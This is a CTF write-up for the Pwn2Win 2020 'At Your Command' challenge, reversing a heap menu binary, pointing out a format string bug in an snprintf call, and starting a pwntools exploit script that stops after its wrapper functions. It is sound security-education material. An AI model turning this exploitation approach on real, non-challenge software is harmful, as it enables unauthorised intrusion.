<!doctype html><html class="dark light"><head><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="width=device-width,initial-scale=1.0" name=viewport><title>
         Pwn2Win 2020 At Your Command Writeup
        
    </title><meta content="Pwn2Win 2020 At Your Command Writeup" property=og:title><link href=https://pwnverse.github.io/fonts.css rel=stylesheet><script>(function(){var a=document.createElement('script');a.setAttribute('src','/js/imamu.js');a.setAttribute('data-website-id','74344cd8-1e87-4c38-8acd-f96049b8f07e');a.setAttribute('data-host-url','https:&#x2F;&#x2F;analytics.eu.umami.is');document.body.appendChild(a)})()</script><script async data-host-url=https://analytics.eu.umami.is data-website-id=74344cd8-1e87-4c38-8acd-f96049b8f07e src=/js/imamu.js></script><script async data-goatcounter=https://Cyb0rG.goatcounter.com/count src=https://pwnverse.github.io/js/count.js></script><noscript><img src="https://Cyb0rG.goatcounter.com//count?p=/posts/command/&t=Pwn2Win 2020 At Your Command Writeup"></noscript><link title="Cyb0rG's Home" href=https://pwnverse.github.io/atom.xml rel=alternate type=application/atom+xml><link href=https://pwnverse.github.io/theme/light.css rel=stylesheet><link href=https://pwnverse.github.io/theme/dark.css id=darkModeStyle rel=stylesheet><link href=https://pwnverse.github.io/main.css media=screen rel=stylesheet><body><div class=content><header><div class=main><a href=https://pwnverse.github.io>Cyb0rG's Home</a><div class=socials><a class=social href=https://twitter.com/_Cyb0rG rel=me> <img alt=twitter src=/social_icons/twitter.svg> </a><a class=social href=https://github.com/PwnVerse/ rel=me> <img alt=github src=/social_icons/github.svg> </a></div></div><nav><a href=/posts style=margin-left:.7em>/posts</a><a href=/projects style=margin-left:.7em>/projects</a><a href=/about style=margin-left:.7em>/about</a> | <a href=javascript:void(0) id=dark-mode-toggle onclick=toggleTheme()> <img id=sun-icon src=/feather/sun.svg style=filter:invert(1)> <img id=moon-icon src=/feather/moon.svg> </a><script src=https://pwnverse.github.io/js/themetoggle.js></script></nav></header><main><article><div class=title><div class=page-header>Pwn2Win 2020 At Your Command Writeup<span class=primary-color style=font-size:1.6em>.</span></div><div class=meta>Posted on <time>2020-05-31</time></div></div><section class=body><p>We had a great time playing Pwn2Win CTF held this weekend. I spent most of my time in solving the challenge <strong>At Your Command</strong>.<h2 id=tl-dr-of-the-challenge-binary>TL;DR OF THE CHALLENGE BINARY</h2><p>The binary is a standard CTF-style <code>x86 64-bit Dynamically Linked</code> executable. We've been given the binary as well as glibc 2.27 to start with.<p>Here's the output of <em>checksec</em>.<pre class=language-sh data-lang=sh style=background:#0f1419;color:#bfbab0><code class=language-sh data-lang=sh><span style=color:#ffb454>gdb-peda$</span><span> checksec
</span><span style=color:#ffb454>CANARY</span><span>    : ENABLED
</span><span style=color:#ffb454>FORTIFY</span><span>   : disabled
</span><span style=color:#ffb454>NX</span><span>        : ENABLED
</span><span style=color:#ffb454>PIE</span><span>       : ENABLED
</span><span style=color:#ffb454>RELRO</span><span>     : FULL
</span><span>
</span></code></pre><p>Without any further delay , let's get into reversing the binary.<h2 id=reversing>REVERSING</h2><p>Initially the binary takes a <strong>name</strong> string of size 12 bytes as input.<pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span> </span><span style=color:#ffb454>printf</span><span>(</span><span style=color:#c2d94c>"Your name: "</span><span style=color:#bfbab0cc>,</span><span> a2)</span><span style=color:#bfbab0cc>;
</span><span> v6 </span><span style=color:#f29668>= </span><span style=color:#ffb454>read</span><span>(</span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>,</span><span> buf</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>12</span><span style=color:#ff7733>uLL</span><span>)</span><span style=color:#bfbab0cc>;
</span></code></pre><p>And then we are directed to a standard Menu-Driven program.<pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span style=color:#ff7733>int </span><span style=color:#ffb454>command_menu</span><span>()
</span><span>{
</span><span>  </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#f29668>&</span><span>byte_5555555555FA)</span><span style=color:#bfbab0cc>;
</span><span>  </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"Choose an option:"</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>  </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"1. Include command"</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>  </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"2. Review command"</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>  </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"3. Delete command"</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>  </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"4. List commands"</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>  </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"5. Send commands"</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>  </span><span style=color:#ff7733>return </span><span style=color:#f07178>printf</span><span>(</span><span style=color:#c2d94c>"> "</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>}
</span></code></pre><p>Let's see what each functionality has to do.<ul><li><strong>Include Command</strong> aka ADD : <ol><li>Can Allocate 10 chunks at max.<li>Stores heap pointers in an array located in stack.<li>Calls malloc of size <strong>0x188</strong>.<li>Asks for <strong>Priority</strong> which is a <em>long long integer</em> and places it in the first 8 bytes of the malloc'd chunk.<li>Then reads input of size <strong>0x170</strong> from the next memory location in heap after Priority.</ol></ul><pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span>  </span><span style=color:#ff7733>signed int</span><span> i</span><span style=color:#bfbab0cc>; </span><span style=font-style:italic;color:#5c6773>// [rsp+14h] [rbp-1Ch]
</span><span>  </span><span style=font-style:italic;color:#39bae6>ssize_t</span><span> v3</span><span style=color:#bfbab0cc>; </span><span style=font-style:italic;color:#5c6773>// [rsp+18h] [rbp-18h]
</span><span>
</span><span>  </span><span style=color:#ff7733>for </span><span>( i </span><span style=color:#f29668>= </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>; ; </span><span style=color:#f29668>++</span><span>i )
</span><span>  {
</span><span>    </span><span style=color:#ff7733>if </span><span>( i </span><span style=color:#f29668>> </span><span style=color:#f29718>9 </span><span>)
</span><span>      </span><span style=color:#ff7733>return </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"[INFO] The authorized limit has been reached!"</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#ff7733>if </span><span>( </span><span style=color:#f29668>!*</span><span>(</span><span style=color:#f29718>8</span><span style=color:#ff7733>LL </span><span style=color:#f29668>*</span><span> i </span><span style=color:#f29668>+</span><span> a1) )
</span><span>      </span><span style=color:#ff7733>break</span><span style=color:#bfbab0cc>;
</span><span>  }
</span><span>  </span><span style=color:#f29668>*</span><span>(</span><span style=color:#f29718>8</span><span style=color:#ff7733>LL </span><span style=color:#f29668>*</span><span> i </span><span style=color:#f29668>+</span><span> a1) </span><span style=color:#f29668>= </span><span style=color:#f07178>malloc</span><span>(</span><span style=color:#f29718>0x188</span><span style=color:#ff7733>uLL</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>  </span><span style=color:#ffb454>printf</span><span>(</span><span style=color:#c2d94c>"Priority: "</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>  </span><span style=color:#f29668>**</span><span>(</span><span style=color:#f29718>8</span><span style=color:#ff7733>LL </span><span style=color:#f29668>*</span><span> i </span><span style=color:#f29668>+</span><span> a1) </span><span style=color:#f29668>= </span><span style=color:#ffb454>get_int_0</span><span>()</span><span style=color:#bfbab0cc>;
</span><span>  </span><span style=color:#ffb454>printf</span><span>(</span><span style=color:#c2d94c>"Command: "</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>  v3 </span><span style=color:#f29668>= </span><span style=color:#ffb454>read</span><span>(</span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>, </span><span>(</span><span style=color:#f29668>*</span><span>(</span><span style=color:#f29718>8</span><span style=color:#ff7733>LL </span><span style=color:#f29668>*</span><span> i </span><span style=color:#f29668>+</span><span> a1) </span><span style=color:#f29668>+ </span><span style=color:#f29718>8</span><span style=color:#ff7733>LL</span><span>)</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0x170</span><span style=color:#ff7733>uLL</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>  </span><span style=color:#ff7733>if </span><span>( v3 )
</span><span>  {
</span><span>    </span><span style=color:#ff7733>if </span><span>( </span><span style=color:#f29668>*</span><span>(</span><span style=color:#f29668>*</span><span>(</span><span style=color:#f29718>8</span><span style=color:#ff7733>LL </span><span style=color:#f29668>*</span><span> i </span><span style=color:#f29668>+</span><span> a1) </span><span style=color:#f29668>+</span><span> v3 </span><span style=color:#f29668>- </span><span style=color:#f29718>1 </span><span style=color:#f29668>+ </span><span style=color:#f29718>8</span><span>) </span><span style=color:#f29668>== </span><span style=color:#f29718>10 </span><span>)
</span><span>      </span><span style=color:#f29668>*</span><span>(</span><span style=color:#f29668>*</span><span>(</span><span style=color:#f29718>8</span><span style=color:#ff7733>LL </span><span style=color:#f29668>*</span><span> i </span><span style=color:#f29668>+</span><span> a1) </span><span style=color:#f29668>+</span><span> v3 </span><span style=color:#f29668>- </span><span style=color:#f29718>1 </span><span style=color:#f29668>+ </span><span style=color:#f29718>8</span><span>) </span><span style=color:#f29668>= </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>;
</span><span>  }
</span><span>  </span><span style=color:#ff7733>return </span><span style=color:#f07178>printf</span><span>(</span><span style=color:#c2d94c>"The command has been included at index </span><span style=color:#f29718>%d</span><span style=color:#95e6cb>\n</span><span style=color:#c2d94c>"</span><span style=color:#bfbab0cc>,</span><span> i)</span><span style=color:#bfbab0cc>;
</span></code></pre><ul><li><strong>View</strong> <ol><li>Views the chunk at the requested index.</ol></ul><pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span>
</span><span>  </span><span style=font-style:italic;color:#39bae6>__int64</span><span> v1</span><span style=color:#bfbab0cc>; </span><span style=font-style:italic;color:#5c6773>// rax
</span><span>  </span><span style=color:#ff7733>int</span><span> v3</span><span style=color:#bfbab0cc>; </span><span style=font-style:italic;color:#5c6773>// [rsp+1Ch] [rbp-4h]
</span><span>
</span><span>  </span><span style=color:#ffb454>printf</span><span>(</span><span style=color:#c2d94c>"Command index: "</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>  </span><span style=color:#ffb454>LODWORD</span><span>(v1) </span><span style=color:#f29668>= </span><span style=color:#ffb454>get_int</span><span>()</span><span style=color:#bfbab0cc>;
</span><span>  v3 </span><span style=color:#f29668>=</span><span> v1</span><span style=color:#bfbab0cc>;
</span><span>  </span><span style=color:#ff7733>if </span><span>( v1 </span><span style=color:#f29668>>= </span><span style=color:#f29718>0 </span><span style=color:#f29668>&&</span><span> v1 </span><span style=color:#f29668><= </span><span style=color:#f29718>9 </span><span>)
</span><span>  {
</span><span>    v1 </span><span style=color:#f29668>= *</span><span>(</span><span style=color:#f29718>8</span><span style=color:#ff7733>LL </span><span style=color:#f29668>*</span><span> v1 </span><span style=color:#f29668>+</span><span> a1)</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#ff7733>if </span><span>( v1 )
</span><span>    {
</span><span>      </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#f29668>&</span><span>byte_5555555555FA)</span><span style=color:#bfbab0cc>;
</span><span>      </span><span style=color:#ffb454>LODWORD</span><span>(v1) </span><span style=color:#f29668>= </span><span style=color:#ffb454>print_name_0</span><span>(</span><span style=color:#f29668>*</span><span>(</span><span style=color:#f29718>8</span><span style=color:#ff7733>LL </span><span style=color:#f29668>*</span><span> v3 </span><span style=color:#f29668>+</span><span> a1))</span><span style=color:#bfbab0cc>;
</span><span>    }
</span><span>  }
</span></code></pre><ul><li><strong>Delete</strong> <ol><li>It frees the chunk at the requested index and also <strong>NULLS</strong> out the pointer on stack.<li>Hence no UAF.</ol></ul><pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span>  </span><span style=font-style:italic;color:#39bae6>__int64</span><span> v1</span><span style=color:#bfbab0cc>; </span><span style=font-style:italic;color:#5c6773>// rax
</span><span>  </span><span style=color:#ff7733>int</span><span> v3</span><span style=color:#bfbab0cc>; </span><span style=font-style:italic;color:#5c6773>// [rsp+1Ch] [rbp-4h]
</span><span>
</span><span>  </span><span style=color:#ffb454>printf</span><span>(</span><span style=color:#c2d94c>"Command index: "</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>  </span><span style=color:#ffb454>LODWORD</span><span>(v1) </span><span style=color:#f29668>= </span><span style=color:#ffb454>get_int</span><span>()</span><span style=color:#bfbab0cc>;
</span><span>  v3 </span><span style=color:#f29668>=</span><span> v1</span><span style=color:#bfbab0cc>;
</span><span>  </span><span style=color:#ff7733>if </span><span>( v1 </span><span style=color:#f29668>>= </span><span style=color:#f29718>0 </span><span style=color:#f29668>&&</span><span> v1 </span><span style=color:#f29668><= </span><span style=color:#f29718>9 </span><span>)
</span><span>  {
</span><span>    v1 </span><span style=color:#f29668>= *</span><span>(</span><span style=color:#f29718>8</span><span style=color:#ff7733>LL </span><span style=color:#f29668>*</span><span> v1 </span><span style=color:#f29668>+</span><span> a1)</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#ff7733>if </span><span>( v1 )
</span><span>    {
</span><span>      </span><span style=color:#f07178>free</span><span>(</span><span style=color:#f29668>*</span><span>(</span><span style=color:#f29718>8</span><span style=color:#ff7733>LL </span><span style=color:#f29668>*</span><span> v3 </span><span style=color:#f29668>+</span><span> a1))</span><span style=color:#bfbab0cc>;
</span><span>      </span><span style=color:#f29668>*</span><span>(</span><span style=color:#f29718>8</span><span style=color:#ff7733>LL </span><span style=color:#f29668>*</span><span> v3 </span><span style=color:#f29668>+</span><span> a1) </span><span style=color:#f29668>= </span><span style=color:#f29718>0</span><span style=color:#ff7733>LL</span><span style=color:#bfbab0cc>;
</span><span>      </span><span style=color:#ffb454>LODWORD</span><span>(v1) </span><span style=color:#f29668>= </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"The command has been successfully deleted"</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>    }
</span><span>  }
</span><span>  </span><span style=color:#ff7733>return</span><span> v1</span><span style=color:#bfbab0cc>;
</span><span>
</span></code></pre><ul><li><strong>List</strong> <ol><li>Prints out content of all existing chunks.</ol></ul><pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span>  </span><span style=font-style:italic;color:#39bae6>__int64</span><span> v1</span><span style=color:#bfbab0cc>; </span><span style=font-style:italic;color:#5c6773>// rax
</span><span>  </span><span style=color:#ff7733>signed int</span><span> i</span><span style=color:#bfbab0cc>; </span><span style=font-style:italic;color:#5c6773>// [rsp+1Ch] [rbp-4h]
</span><span>
</span><span>  </span><span style=color:#ff7733>for </span><span>( i </span><span style=color:#f29668>= </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>;</span><span> i </span><span style=color:#f29668><= </span><span style=color:#f29718>9</span><span style=color:#bfbab0cc>; </span><span style=color:#f29668>++</span><span>i )
</span><span>  {
</span><span>    v1 </span><span style=color:#f29668>= *</span><span>(</span><span style=color:#f29718>8</span><span style=color:#ff7733>LL </span><span style=color:#f29668>*</span><span> i </span><span style=color:#f29668>+</span><span> a1)</span><span style=color:#bfbab0cc>;
</span><span>    </span><span style=color:#ff7733>if </span><span>( v1 )
</span><span>    {
</span><span>      </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#f29668>&</span><span>byte_5555555555FA)</span><span style=color:#bfbab0cc>;
</span><span>      </span><span style=color:#f07178>printf</span><span>(</span><span style=color:#c2d94c>"Index </span><span style=color:#f29718>%d</span><span style=color:#95e6cb>\n</span><span style=color:#c2d94c>"</span><span style=color:#bfbab0cc>,</span><span> i)</span><span style=color:#bfbab0cc>;
</span><span>      </span><span style=color:#ffb454>LODWORD</span><span>(v1) </span><span style=color:#f29668>= </span><span style=color:#ffb454>print_name_0</span><span>(</span><span style=color:#f29668>*</span><span>(</span><span style=color:#f29718>8</span><span style=color:#ff7733>LL </span><span style=color:#f29668>*</span><span> i </span><span style=color:#f29668>+</span><span> a1))</span><span style=color:#bfbab0cc>;
</span><span>    }
</span><span>  }
</span><span>  </span><span style=color:#ff7733>return</span><span> v1</span><span style=color:#bfbab0cc>;
</span><span>
</span></code></pre><p>We can return from the Menu driven code by sending a <strong>5</strong> and then something interesting happens.<pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span>  v3 </span><span style=color:#f29668>= </span><span style=color:#f07178>time</span><span>(</span><span style=color:#f29718>0</span><span style=color:#ff7733>LL</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>  </span><span style=color:#ffb454>snprintf</span><span>(filename</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>0x2D</span><span style=color:#ff7733>uLL</span><span style=color:#bfbab0cc>, </span><span style=color:#c2d94c>"/commands/</span><span style=color:#f29718>%ld</span><span style=color:#c2d94c>"</span><span style=color:#bfbab0cc>,</span><span> v3)</span><span style=color:#bfbab0cc>;
</span><span>  stream </span><span style=color:#f29668>= </span><span style=color:#f07178>fopen</span><span>(filename</span><span style=color:#bfbab0cc>,</span><span> modes)</span><span style=color:#bfbab0cc>;
</span></code></pre><p>The binary opens a file with the name as return value of <strong>time(0)</strong> which is pretty cool.<p>Then it calls another function which does some operations on the file.<p>Here , the binary asks for yet another input of a long long integer but there's a twist here.<p>Let's see what that is.<pre class=language-sh data-lang=sh style=background:#0f1419;color:#bfbab0><code class=language-sh data-lang=sh><span>    </span><span style=color:#ffb454>0000555555555299</span><span>                 call    get_int_0
</span><span>    </span><span style=color:#ffb454>000055555555529E</span><span>                 cdqe
</span></code></pre><p>There's a <strong>cdqe</strong> instruction which will make our long long integer into 4 bytes.<p>So if we think of giving a valid address there , its not something u want to do.<p>Moving on , we have calls to fprintf to copy all our chunks' data into the file that was opened previously.<p><strong>NOTICE</strong> We should remember that <em>fprintf</em> internally calls malloc again. {: .notice}<pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span style=color:#ffb454>fprintf</span><span>(</span><span style=color:#f29668>*</span><span>stream</span><span style=color:#bfbab0cc>, </span><span style=color:#c2d94c>"Id: </span><span style=color:#f29718>%lld</span><span style=color:#95e6cb>\n</span><span style=color:#c2d94c>"</span><span style=color:#bfbab0cc>,</span><span> v2</span><span style=color:#bfbab0cc>,</span><span> stream)</span><span style=color:#bfbab0cc>;
</span><span>  </span><span style=color:#ff7733>for </span><span>( i </span><span style=color:#f29668>= </span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>;</span><span> i </span><span style=color:#f29668><= </span><span style=color:#f29718>9</span><span style=color:#bfbab0cc>; </span><span style=color:#f29668>++</span><span>i )
</span><span>  {
</span><span>    </span><span style=color:#ff7733>if </span><span>( </span><span style=color:#f29668>*</span><span>(</span><span style=color:#f29718>8</span><span style=color:#ff7733>LL </span><span style=color:#f29668>*</span><span> i </span><span style=color:#f29668>+</span><span> a1) )
</span><span>      </span><span style=color:#f07178>fprintf</span><span>(</span><span style=color:#f29668>*</span><span>v4</span><span style=color:#bfbab0cc>, </span><span style=color:#c2d94c>"</span><span style=color:#f29718>%lld</span><span style=color:#c2d94c>:</span><span style=color:#f29718>%s</span><span style=color:#95e6cb>\n</span><span style=color:#c2d94c>"</span><span style=color:#bfbab0cc>, </span><span style=color:#f29668>**</span><span>(</span><span style=color:#f29718>8</span><span style=color:#ff7733>LL </span><span style=color:#f29668>*</span><span> i </span><span style=color:#f29668>+</span><span> a1)</span><span style=color:#bfbab0cc>, </span><span style=color:#f29668>*</span><span>(</span><span style=color:#f29718>8</span><span style=color:#ff7733>LL </span><span style=color:#f29668>*</span><span> i </span><span style=color:#f29668>+</span><span> a1) </span><span style=color:#f29668>+ </span><span style=color:#f29718>8</span><span style=color:#ff7733>LL</span><span>)</span><span style=color:#bfbab0cc>;
</span><span>  }
</span></code></pre><p>Just after that , we have a vulnerable snprintf coming through.<pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span style=color:#ffb454>snprintf</span><span>(</span><span style=color:#f29668>&</span><span>src</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>0xc</span><span style=color:#bfbab0cc>,</span><span>buf)</span><span style=color:#bfbab0cc>;
</span></code></pre><p>Reminding you that <strong>buf</strong> was the initial name that we entered on bss and <strong>src</strong> is a local variable located at <strong>[rbp-0x30]</strong>.<p>As there is no format specifier , our buf acts as the format specifier and thus we have the infamous <strong>Format String Vulnerability</strong>.<p>We copy our 12 bytes of buf to src.<pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span>   </span><span style=color:#f29668>*&</span><span>s </span><span style=color:#f29668>= </span><span style=color:#c2d94c>" .rM"</span><span style=color:#bfbab0cc>;
</span><span>   v8</span><span style=color:#f29668>=</span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>;
</span><span>   </span><span style=color:#ffb454>strcat</span><span>(</span><span style=color:#f29668>&</span><span>s</span><span style=color:#bfbab0cc>,</span><span style=color:#f29668>&</span><span>src)</span><span style=color:#bfbab0cc>;
</span><span>   </span><span style=color:#ffb454>printf</span><span>(</span><span style=color:#c2d94c>"You command </span><span style=color:#f29718>%s</span><span style=color:#95e6cb>\n</span><span style=color:#c2d94c>"</span><span style=color:#bfbab0cc>,</span><span style=color:#f29668>&</span><span>s)</span><span style=color:#bfbab0cc>;
</span></code></pre><p>Here <strong>s</strong> is an <em>char</em> array located at <strong>[rbp-0x20]</strong>.<p><strong>strcat</strong> will concatenate <em>s</em> with <em>src</em> but here we will not run into any buffer overrruns because even after concatenating, we will not reach out of bounds.<p>After all this is done ,<strong>fclose</strong> is called on the stream in the end.<pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span style=color:#ffb454>fclose</span><span>(stream)</span><span style=color:#bfbab0cc>;
</span></code></pre><p>Now that we have reversed the binary , let us start writing exploit.<h2 id=exploit-development>EXPLOIT DEVELOPMENT</h2><h3 id=setting-up-the-local-environment>Setting up the Local Environment</h3><p>For those of you who dont want another <code>/commands</code> folder in your root directory can simply edit the binary using ghex just the way it is done for preloading Libc.<p>We edit the string <strong>/commands/%lld</strong> in ghex with <strong>./ommands/%lld</strong> and create a folder <em>ommands</em> in the PWD.<p>To make sure that a file with name <strong>./ommands/time(0)</strong> exists in that directory , we can use the <strong>ctypes</strong> python library and get the value of <strong>time(0)</strong> which we can pass to os.system and touch a file with that name to create it.<p>Here's the script to get things started with all wrapper functions.<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span style=color:#ff7733>from </span><span>pwn </span><span style=color:#ff7733>import </span><span style=color:#f29718>*
</span><span style=color:#ff7733>import </span><span>sys
</span><span style=color:#ff7733>import </span><span>ctypes
</span><span style=color:#ff7733>from </span><span>ctypes </span><span style=color:#ff7733>import </span><span style=color:#f29718>*
</span><span style=color:#ff7733>import </span><span>os
</span><span>
</span><span>context</span><span style=color:#f29668>.</span><span>arch</span><span style=color:#f29668>=</span><span style=color:#c2d94c>"amd64"
</span><span>
</span><span style=color:#ff7733>def </span><span style=color:#ffb454>setup_env</span><span>():
</span><span>    libc </span><span style=color:#f29668>= </span><span>ctypes</span><span style=color:#f29668>.</span><span>cdll</span><span style=color:#f29668>.</span><span style=color:#ffb454>LoadLibrary</span><span>(</span><span style=color:#c2d94c>"./libc.so.6"</span><span>)
</span><span>    LIBC </span><span style=color:#f29668>= </span><span style=color:#ffb454>ELF</span><span>(</span><span style=color:#c2d94c>"./libc.so.6"</span><span>)
</span><span>    time </span><span style=color:#f29668>= </span><span>libc</span><span style=color:#f29668>.</span><span style=color:#ffb454>time</span><span>(</span><span style=color:#f29718>0</span><span>)
</span><span>    os</span><span style=color:#f29668>.</span><span style=color:#ffb454>system</span><span>(</span><span style=color:#c2d94c>"touch ./ommands/</span><span style=color:#f29718>{}</span><span style=color:#c2d94c>"</span><span style=color:#f29668>.</span><span style=color:#ffb454>format</span><span>(time))
</span><span>
</span><span style=color:#ff7733>if</span><span>(</span><span style=color:#f07178>len</span><span>(sys</span><span style=color:#f29668>.</span><span>argv)</span><span style=color:#f29668>></span><span style=color:#f29718>1</span><span>):
</span><span>    io</span><span style=color:#f29668>=</span><span style=color:#ffb454>remote</span><span>(</span><span style=color:#c2d94c>'command.pwn2.win'</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>1337</span><span>)
</span><span>    context</span><span style=color:#f29668>.</span><span>noptrace</span><span style=color:#f29668>=</span><span style=color:#f29718>True
</span><span style=color:#ff7733>else</span><span>:
</span><span>    io</span><span style=color:#f29668>=</span><span style=color:#ffb454>process</span><span>(</span><span style=color:#c2d94c>"./command"</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>env </span><span style=color:#f29668>= </span><span>{</span><span style=color:#c2d94c>"LD_PRELOAD" </span><span style=color:#bfbab0cc>: </span><span style=color:#c2d94c>"./libc.so.6"</span><span>})
</span><span>    </span><span style=color:#ffb454>setup_env</span><span>()
</span><span>
</span><span>
</span><span style=color:#ff7733>def </span><span style=color:#ffb454>send_name</span><span>(</span><span style=color:#f29718>name</span><span>):
</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendafter</span><span>(</span><span style=color:#c2d94c>'Your name: '</span><span style=color:#bfbab0cc>,</span><span>name)
</span><span>
</span><span style=color:#ff7733>def </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>priority</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>command</span><span>):
</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>'> '</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'1'</span><span>)
</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>'Priority: '</span><span style=color:#bfbab0cc>,</span><span style=font-style:italic;color:#39bae6>str</span><span>(priority))
</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendafter</span><span>(</span><span style=color:#c2d94c>'Command: '</span><span style=color:#bfbab0cc>,</span><span>command)
</span><span>
</span><span style=color:#ff7733>def </span><span style=color:#ffb454>view</span><span>(</span><span style=color:#f29718>idx</span><span>):
</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>'> '</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'2'</span><span>)
</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>'index: '</span><span style=color:#bfbab0cc>,</span><span style=font-style:italic;color:#39bae6>str</span><span>(idx))
</span><span>
</span><span style=color:#ff7733>def </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>idx</span><span>):
</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>'> '</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'3'</span><span>)
</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>'index: '</span><span style=color:#bfbab0cc>,</span><span style=font-style:italic;color:#39bae6>str</span><span>(idx))
</span><span>
</span><span style=color:#ff7733>def </span><span style=color:#ffb454>list</span><span>():
</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>'> '</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'4'</span><span>)
</span><span>
</span><span style=color:#ff7733>def </span><span style=color:#ffb454>ret</span><span>():
</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>'> '</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'5'</span><span>)
</span><span>
</span><span style=color:#ff7733>def </span><span style=color:#ffb454>send_commands</span><span>(</span><span style=color:#f29718>ID</span><span>):
</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(</span><span style=color:#c2d94c>'which rbs?</span><span style=color:#95e6cb>\n</span><span style=color:#c2d94c>'</span><span style=color:#bfbab0cc>,</span><span style=font-style:italic;color:#39bae6>str</span><span>(ID))
</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>recvuntil</span><span>(</span><span style=color:#c2d94c>'You command Mr. '</span><span>)
</span><span>
</span><span>
</span><span style=color:#ff7733>if </span><span>__name__</span><span style=color:#f29668>==</span><span style=color:#c2d94c>"__main__"</span><span>:
</span><span>    
